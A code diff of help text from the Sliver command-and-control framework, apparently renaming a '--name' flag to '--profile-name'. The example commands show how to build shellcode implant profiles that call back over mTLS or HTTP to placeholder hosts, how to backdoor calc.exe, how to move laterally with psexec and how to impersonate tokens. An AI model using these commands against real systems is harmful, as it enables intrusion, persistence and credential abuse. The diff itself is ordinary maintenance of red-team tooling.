@@ -167,16 +167,16 @@ stage-listener --url tcp://1.2.3.4:8080 --profile my-sliver-profile
 
 To create a profile, use the [[.Bold]]new-profile[[.Normal]] command. A common scenario is to create a profile that generates a shellcode, which can act as a stage 2:
 
-new-profile --name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
+new-profile --profile-name windows-shellcode --format shellcode --mtls 1.2.3.4 --skip-symbols
 `
 
-	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--name] <options>
+	newProfileHelp = `[[.Bold]]Command:[[.Normal]] new-profile [--profile-name] <options>
 [[.Bold]]About:[[.Normal]] Create a new profile with a given name and options, a name is required.
 
 [[.Bold]][[.Underline]]++ Profiles ++[[.Normal]]
 Profiles are an easy way to save a sliver configurate and easily generate multiple copies of the binary with the same
 settings, but will still have per-binary certificates/obfuscation/etc. This command is used with generate-profile:
-	new-profile --name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
+	new-profile --profile-name mtls-profile  --mtls foo.example.com --canary 1.foobar.com
 	generate-profile mtls-profile
 `
 
@@ -367,7 +367,7 @@ The profile must be created with the [[.Bold]]service[[.Normal]] format, so that
 
 To create such a profile, use the [[.Bold]]new-profile[[.Normal]] command:
 
-new-profile --format service --skip-symbols --mtls a.bc.de --name win-svc64
+new-profile --format service --skip-symbols --mtls a.bc.de --profile-name win-svc64
 
 Once the profile has been created, run the [[.Bold]]psexec[[.Normal]] command:
 
@@ -379,7 +379,7 @@ The [[.Bold]]psexec[[.Normal]] command will use the credentials of the Windows u
 [[.Bold]]About:[[.Normal]] Inject a sliver shellcode into an existing file on the target system.
 [[.Bold]]Example:[[.Normal]] backdoor --profile windows-shellcode "c:\windows\system32\calc.exe"
 
-[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --name whatever --http ab.cd
+[[.Bold]]Remark:[[.Normal]] you must first create a profile that will serve as your base shellcode, with the following command: new-profile --format shellcode --profile-name whatever --http ab.cd
 `
 	makeTokenHelp = `[[.Bold]]Command:[[.Normal]] make-token -u USERNAME -d DOMAIN -p PASSWORD
 [[.Bold]]About:[[.Normal]] Creates a new Logon Session from the specified credentials and impersonate the resulting token.
